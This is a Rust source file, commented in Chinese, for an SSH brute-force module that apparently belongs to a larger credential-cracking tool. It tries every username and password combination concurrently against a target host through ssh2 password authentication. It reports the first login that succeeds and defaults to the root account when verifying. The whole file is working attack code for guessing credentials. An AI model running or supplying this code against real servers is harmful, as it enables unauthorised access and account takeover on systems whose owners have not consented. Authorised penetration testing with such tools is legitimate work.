//! SSH 爆破模块

use async_trait::async_trait;
use ssh2::Session;
use std::net::TcpStream;
use std::time::Duration;

use crate::cracker::service::{CrackConfig, CrackResult, CrackService, Cracker};
use std::sync::Arc;
use tokio::sync::Semaphore;

/// SSH 爆破器
pub struct SshCracker;

impl SshCracker {
    pub fn new() -> Self {
        Self
    }
}

impl Default for SshCracker {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Cracker for SshCracker {
    async fn crack(&self, config: &CrackConfig) -> CrackResult {
        let start = std::time::Instant::now();
        let semaphore = Arc::new(Semaphore::new(config.concurrency));
        let mut tasks = Vec::new();

        println!();
        println!("开始 SSH 爆破...");
        println!("目标: {}:{}", config.target, config.port);
        println!("用户名数: {}", config.usernames.len());
        println!("密码数: {}", config.passwords.len());
        println!("总尝试次数: {}", config.usernames.len() * config.passwords.len());
        println!();

        for username in &config.usernames {
            for password in &config.passwords {
                let semaphore = semaphore.clone();
                let target = config.target.clone();
                let port = config.port;
                let username = username.clone();
                let password = password.clone();
                let timeout = config.timeout;
                let delay = config.delay_ms;

                let task = tokio::spawn(async move {
                    let _permit = semaphore.acquire().await.unwrap();
                    let result = Self::try_connect(&target, port, &username, &password, timeout).await;

                    // 延迟
                    if let Some(delay_ms) = delay {
                        tokio::time::sleep(Duration::from_millis(delay_ms)).await;
                    }

                    (username, password, result)
                });

                tasks.push(task);
            }
        }

        // 等待所有任务完成
        for task in tasks {
            if let Ok((username, password, success)) = task.await {
                if success {
                    let elapsed = start.elapsed().as_millis() as u64;
                    return CrackResult::success(
                        config.target.clone(),
                        config.port,
                        CrackService::Ssh,
                        Some(username),
                        password,
                        elapsed,
                    );
                }
            }
        }

        CrackResult::failed(
            config.target.clone(),
            config.port,
            CrackService::Ssh,
            None,
            "所有凭据尝试失败".to_string(),
        )
    }

    async fn verify(&self, target: &str, port: u16, username: Option<&str>, password: &str) -> bool {
        let username = username.unwrap_or("root");
        Self::try_connect(target, port, username, password, Duration::from_secs(5)).await
    }
}

impl SshCracker {
    /// 尝试连接
    async fn try_connect(
        target: &str,
        port: u16,
        username: &str,
        password: &str,
        timeout: Duration,
    ) -> bool {
        // 转换为拥有的 String 以满足 'static 要求
        let target = target.to_string();
        let username = username.to_string();
        let password = password.to_string();

        tokio::task::spawn_blocking(move || {
            let addr = format!("{}:{}", target, port);

            // 尝试 TCP 连接
            let stream = match TcpStream::connect(&addr) {
                Ok(s) => s,
                Err(_) => return false,
            };

            // 设置超时
            if let Err(_) = stream.set_read_timeout(Some(timeout)) {
                return false;
            }
            if let Err(_) = stream.set_write_timeout(Some(timeout)) {
                return false;
            }

            // 创建 SSH 会话
            let mut sess = match Session::new() {
                Ok(s) => s,
                Err(_) => return false,
            };

            sess.set_tcp_stream(stream);

            if let Err(_) = sess.handshake() {
                return false;
            }

            // 尝试认证
            match sess.userauth_password(&username, &password) {
                Ok(_) => true,
                Err(_) => false,
            }
        })
        .await
        .unwrap_or(false)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_ssh_cracker_creation() {
        let cracker = SshCracker::new();
        assert_eq!(cracker.verify("127.0.0.1", 22, Some("root"), "wrongpassword").await, false);
    }
}
